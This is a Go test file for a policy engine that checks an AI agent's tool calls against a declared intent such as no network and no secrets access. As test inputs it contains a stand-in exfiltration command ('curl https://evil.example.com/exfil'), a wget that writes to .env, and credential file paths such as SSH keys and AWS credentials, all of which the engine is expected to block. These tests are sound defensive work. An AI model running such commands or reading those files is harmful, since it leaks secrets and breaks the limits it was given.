package policy_test

import (
	"strings"
	"testing"

	"github.com/SigNoz/signoz/pkg/query-service/vigil/policy"
)

// fixTests is the README's worked example: "Fix failing tests in this
// repository. You may read source files and run tests. No network access, no
// secrets. Maximum budget: $2."
func fixTests() *policy.Policy {
	p := &policy.Policy{
		SessionID:      "s1",
		DeclaredIntent: "Fix failing tests. Read sources and run tests. No network, no secrets.",
		AllowedTools:   []string{"read_file", "search_code", "list_directory", "run_command"},
		BudgetUSD:      2,
		RiskTolerance:  policy.RiskMedium,
		NetworkAccess:  false,
		SecretAccess:   false,
	}
	p.Normalize()
	return p
}

func TestAllowsToolWithinIntent(t *testing.T) {
	v := fixTests().Evaluate("read_file", map[string]any{"path": "main.go"})
	if v.Outcome != policy.Allow {
		t.Fatalf("Expected ALLOW, got %s (%s)", v.Outcome, v.Reason)
	}
	if !strings.Contains(v.Reason, "permitted by declared intent") {
		t.Fatalf("Expected an explainable reason, got %q", v.Reason)
	}
}

func TestBlocksExplicitlyDeniedTool(t *testing.T) {
	p := fixTests()
	p.DeniedTools = []string{"run_command"}
	v := p.Evaluate("run_command", map[string]any{"command": "go test ./..."})
	if v.Outcome != policy.Block {
		t.Fatalf("Expected BLOCK for an explicitly denied tool, got %s", v.Outcome)
	}
}

// TestDenyBeatsAllow: a tool on the allowlist that is also denied must be
// blocked. Order of precedence is a security property, not a preference.
func TestDenyBeatsAllow(t *testing.T) {
	p := &policy.Policy{
		AllowedTools:  []string{"run_command"},
		DeniedTools:   []string{"run_command"},
		RiskTolerance: policy.RiskMedium,
		NetworkAccess: true,
		SecretAccess:  true,
	}
	if v := p.Evaluate("run_command", nil); v.Outcome != policy.Block {
		t.Fatalf("Expected deny to win over allow, got %s", v.Outcome)
	}
}

func TestBlocksNetworkViolation(t *testing.T) {
	v := fixTests().Evaluate("run_command", map[string]any{"command": "curl https://evil.example.com/exfil"})
	if v.Outcome != policy.Block {
		t.Fatalf("Expected BLOCK for a network call under a no-network intent, got %s", v.Outcome)
	}
	if !strings.Contains(v.Reason, "network") {
		t.Fatalf("Expected the reason to name the network violation, got %q", v.Reason)
	}
}

func TestAllowsNonNetworkShellCommand(t *testing.T) {
	// The same tool, benign arguments: this is what argument-level
	// categorisation buys over a flat per-tool allowlist.
	v := fixTests().Evaluate("run_command", map[string]any{"command": "go test ./..."})
	if v.Outcome != policy.Allow {
		t.Fatalf("Expected ALLOW for a local test run, got %s (%s)", v.Outcome, v.Reason)
	}
}

func TestBlocksSecretPathRead(t *testing.T) {
	for _, path := range []string{".env", "config/.env.production", "/home/u/.ssh/id_rsa", "certs/server.pem", "~/.aws/credentials"} {
		v := fixTests().Evaluate("read_file", map[string]any{"path": path})
		if v.Outcome != policy.Block {
			t.Fatalf("Expected BLOCK reading %q under a no-secrets intent, got %s", path, v.Outcome)
		}
	}
}

func TestAllowsOrdinarySourceRead(t *testing.T) {
	v := fixTests().Evaluate("read_file", map[string]any{"path": "pkg/server/handler.go"})
	if v.Outcome != policy.Allow {
		t.Fatalf("Expected ALLOW reading a source file, got %s (%s)", v.Outcome, v.Reason)
	}
}

// TestAllowlistMissIsUncertain: an uncovered call is not a violation, it is
// the canonical case to escalate for judgement.
func TestAllowlistMissIsUncertain(t *testing.T) {
	v := fixTests().Evaluate("signoz_query_traces", nil)
	if v.Outcome != policy.Uncertain {
		t.Fatalf("Expected UNCERTAIN for an uncovered tool, got %s", v.Outcome)
	}
}

// TestLowRiskToleranceDeniesUncovered: under LOW, an allowlist is a whitelist.
func TestLowRiskToleranceDeniesUncovered(t *testing.T) {
	p := fixTests()
	p.RiskTolerance = policy.RiskLow
	if v := p.Evaluate("signoz_query_traces", nil); v.Outcome != policy.Block {
		t.Fatalf("Expected BLOCK under LOW risk tolerance, got %s", v.Outcome)
	}
}

// TestDefaultPolicyPermitsEverything is the upgrade-safety test: a session that
// never declared an intent must behave exactly as it did before intent
// enforcement existed.
func TestDefaultPolicyPermitsEverything(t *testing.T) {
	p := policy.Default("s", 5)
	if !p.IsDefault() {
		t.Fatal("Expected the baseline policy to identify itself as default")
	}
	for _, tc := range []struct {
		tool string
		args map[string]any
	}{
		{"read_file", map[string]any{"path": ".env"}},
		{"run_command", map[string]any{"command": "curl https://example.com"}},
		{"signoz_query_traces", nil},
	} {
		if v := p.Evaluate(tc.tool, tc.args); v.Outcome != policy.Allow {
			t.Fatalf("Expected the default policy to allow %s, got %s", tc.tool, v.Outcome)
		}
	}
}

func TestDeniedResourceCategory(t *testing.T) {
	p := &policy.Policy{
		DeniedResources: []string{policy.CatExec},
		RiskTolerance:   policy.RiskMedium,
		NetworkAccess:   true,
		SecretAccess:    true,
	}
	if v := p.Evaluate("run_command", map[string]any{"command": "ls"}); v.Outcome != policy.Block {
		t.Fatalf("Expected BLOCK for a denied capability, got %s", v.Outcome)
	}
}

func TestValidateRejectsBadInput(t *testing.T) {
	cases := map[string]*policy.Policy{
		"bad risk":         {RiskTolerance: "SPICY"},
		"unknown category": {RiskTolerance: policy.RiskLow, DeniedResources: []string{"telepathy"}},
		"contradiction":    {RiskTolerance: policy.RiskLow, AllowedTools: []string{"x"}, DeniedTools: []string{"x"}},
	}
	for name, p := range cases {
		if err := p.Validate(); err == nil {
			t.Fatalf("Expected %s to fail validation", name)
		}
	}
}

func TestNormalizeDedupesAndLowercases(t *testing.T) {
	p := &policy.Policy{
		AllowedTools: []string{"Read_File", "read_file", "  ", "SEARCH_CODE"},
		BudgetUSD:    -5,
	}
	p.Normalize()
	if len(p.AllowedTools) != 2 {
		t.Fatalf("Expected duplicates and empties removed, got %v", p.AllowedTools)
	}
	if p.BudgetUSD != 0 {
		t.Fatalf("Expected a negative budget clamped to 0, got %v", p.BudgetUSD)
	}
	if p.RiskTolerance != policy.RiskMedium {
		t.Fatalf("Expected an empty risk tolerance to default to MEDIUM, got %q", p.RiskTolerance)
	}
}

func TestCategoriesTagArgumentsNotJustTools(t *testing.T) {
	cats := policy.Categories("run_command", map[string]any{"command": "wget https://x/y -O .env"})
	for _, want := range []string{policy.CatExec, policy.CatNetwork, policy.CatSecret} {
		found := false
		for _, c := range cats {
			if c == want {
				found = true
			}
		}
		if !found {
			t.Fatalf("Expected category %q in %v", want, cats)
		}
	}
}

func TestStoreCloneIsolation(t *testing.T) {
	s := policy.NewStore()
	p := fixTests()
	s.Set(p)

	got := s.Get("s1")
	got.NetworkAccess = true // mutate the copy
	got.DeniedTools = append(got.DeniedTools, "everything")

	again := s.Get("s1")
	if again.NetworkAccess {
		t.Fatal("Mutating a returned policy leaked into the store")
	}
	if len(again.DeniedTools) != 0 {
		t.Fatal("Mutating a returned policy's slice leaked into the store")
	}
}

func TestGetOrDefaultFallsBack(t *testing.T) {
	s := policy.NewStore()
	p := s.GetOrDefault("unknown", 7)
	if p == nil || !p.IsDefault() || p.BudgetUSD != 7 {
		t.Fatalf("Expected the permissive baseline with the given budget, got %+v", p)
	}
}
